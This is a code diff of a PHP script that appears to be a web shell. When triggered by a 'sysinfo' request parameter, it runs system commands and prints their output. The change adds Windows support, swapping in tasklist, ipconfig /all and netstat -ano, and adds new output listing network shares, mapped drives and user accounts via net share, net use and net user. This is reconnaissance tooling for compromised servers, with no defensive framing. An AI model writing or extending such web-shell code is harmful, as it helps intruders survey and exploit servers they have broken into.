@@ -98,7 +98,7 @@ if (isset($_REQUEST["sysinfo"])) {
     echo "<b>Operating system</b><br><pre>" . @PHP_OS;
     echo "</pre><b>Server uname</b><br><pre>" . php_uname();
     echo "</pre><b>Server uptime</b><br><pre>";
-    echo ex("uptime");
+    echo  (!$win) ? ex("uptime") : ex("net statistics server");
     echo "</pre><b>Server time</b><br><pre>";
     echo date("D, M d, h:iA");
     echo "</pre><b>Disk space</b><br><pre>";
@@ -118,12 +118,13 @@ if (isset($_REQUEST["sysinfo"])) {
     echo "</pre><b>Memory information</b><br><pre>";
     echo ex("cat /proc/meminfo");
     echo "</pre><b>Open ports and active connections</b><br><pre>";
-    echo ex("netstat -nat");
-    echo "</pre><b>Network devices</b><br><pre>";
-    echo ex("/sbin/ifconfig -a");
+    echo (!$win) ? ex("netstat -nat") : ex("netstat -ano");
+    echo "</pre><b>Network devices</b><br><pre>"; 
+    echo (!$win) ? ex("/sbin/ifconfig -a") : ex("ipconfig /all");
     echo "</pre><b>Processes</b><br><pre>";
-    echo ex("ps auxfww");
+    echo (!$win) ? ex("ps auxfww") : ex("tasklist");
     echo "</pre>";
+	echo ($win) ? "<b>Network use</b><br><pre>".ex("net use")."</pre><b>Network share</b><br><pre>".ex("net share")."</pre><b>Network user</b><br><pre>".ex("net user")."</pre>" : "";
 }
 
 else if(isset($_REQUEST["phpinfo"])) {
